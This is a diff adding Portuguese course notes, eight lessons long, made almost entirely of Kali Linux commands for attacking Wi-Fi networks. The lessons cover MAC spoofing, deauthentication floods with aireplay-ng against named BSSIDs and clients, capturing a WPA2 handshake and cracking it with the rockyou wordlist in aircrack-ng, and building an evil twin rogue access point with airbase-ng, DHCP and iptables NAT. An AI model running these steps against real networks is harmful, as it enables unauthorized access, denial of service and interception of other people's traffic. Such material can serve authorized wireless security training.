@@ -1,0 +1,198 @@
+
+---
+
+// Aula 1 - Preparativos para o nosso cenário
+
+Alguns modelos apenas são compatíveis, geralmente os mais caros e com antenas externas de alto ganho:
+
+adaptador-usb-wireless-tp-link  | :Adaptador Usb Wireless Tp-link]
+
+# iwconfig
+
+# ifconfig wlan0
+
+# iwlist wlan0 scanning
+
+# ifconfig wlan0 up
+
+# airmon-ng start wlan0
+
+Pra habilitar, caso você esteja usando o network manager, terá que desabilitar antes, com o comando:
+
+# airmon-ng check kill
+
+# iwconfig wlan0mon
+
+---
+
+// Aula 2 - Primeiros Ajustes
+
+$ sudo su
+
+# passwd root
+
+# vim /etc/ssh/sshd_config
+
+# systemctl restart ssh
+
+# systemctl enable ssh
+
+# netstat -tpan | grep 22
+
+# apt-get update
+# apt-get dist-upgrade -y
+
+---
+
+// Aula 3 - Monitorando o Ar
+
+# iwconfig wlan0mon
+
+# airodump-ng wlan0mon
+
+# airodump-ng wlan0mon -c 1
+
+# airodump-ng wlan0mon -c 1 --bssid C0:3D:D9:26:98:F2
+
+
+---
+
+// Aula 4 - Alterando o nosso MAC Address
+
+# macchanger -h
+
+# airmon-ng stop wlan0mon
+
+# ifconfig
+
+# macchanger -s wlan0
+
+# ifconfig wlan0 down 
+
+# ifconfig
+
+# macchanger -r wlan0
+
+# macchanger -s wlan0
+
+# ifconfig wlan0 up 
+
+# ifconfig
+
+# ifconfig wlan0 down
+
+# macchanger --mac 12:34:56:78:90:AB wlan0
+
+# ifconfig wlan0 up
+
+# ifconfig
+
+---
+
+// Aula 5 - Localizando redes ocultas
+
+# airmon-ng start wlan0
+
+# ifconfig
+
+# airodump-ng wlan0mon
+
+# airodump-ng wlan0mon -c 10
+
+# aireplay-ng -0 10 -a C0:25:E9:80:C1:50 wlan0mon
+
+---
+
+// Aula 6 - Hackeando Redes Ocultas e clonando MAC Address
+
+# airmon-ng start wlan0
+
+# ifconfig
+
+# airodump-ng wlan0mon -c 10
+
+# aireplay-ng -0 10 -a C0:25:E9:80:C1:50 -c 94:44:44:e7:1b:71 wlan0mon
+
+# airmon-ng stop wlan0mon
+
+---
+
+// Aula 7 - Usando Handshake e brute-force com Wi-Fi WPA2
+
+# airmon-ng start wlan0
+
+# ifconfig
+
+# airodump-ng wlan0mon
+
+# airodump-ng -c 10 --bssid C0:25:E9:80:C1:50 -w captura wlan0mon
+
+# aireplay-ng -0 10 -a C0:25:E9:80:C1:50 -c D0:37:45:C8:17:A9 wlan0mon
+
+# ls
+
+# cd /usr/share/wordlists
+
+# gzip -d rockyou.txt.gz
+
+# ls
+
+# ls -l --block-size=M 
+
+# aircrack-ng -b C0:25:E9:80:C1:50 -w /usr/share/wordlists/rockyou.txt captura-01.cap
+
+---
+
+// Aula 8 - Criando um AP falso com Rogue AP e Evil Twin
+
+# airmon-ng start wlan0
+
+# airodump-ng wlan0mon
+
+# airbase-ng -e Wifi-Teste -c 10 -P wlan0mon
+
+# ifconfig at0 up
+
+# ifconfig
+
+# ifconfig at0 192.168.2.1/24
+
+# route
+
+# route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1
+
+# apt install isc-dhcp-server
+
+# cd /etc/dhcp
+
+# mv dhcpd.conf dhcpd.conf.bk
+
+# vim dhcpd.conf
+
+option domain-name "kali-linux";
+option domain-name-servers 8.8.8.8, 8.8.4.4;
+subnet 192.168.2.0 netmask 255.255.255.0 {
+    range 192.168.2.10 192.168.2.200;
+    option subnet-mask 255.255.255.0;
+    option broadcast-address 192.168.2.255;
+    option routers 192.168.2.1;
+    option domain-name-servers home;
+}
+default-lease-time 600;
+max-lease-time 7200;
+authoritative;
+
+$ sudo systemctl enable isc-dhcp-server
+$ sudo systemctl start isc-dhcp-server
+
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# cat /proc/sys/net/ipv4/ip_forward
+
+# iptables -F
+
+# iptables -L -n
+
+# iptables --table nat --append POSTROUTING --out-interface at0 -j MASQUERADE
+
+# iptables --append FORWARD --in-interface at0 -j ACCEPT~
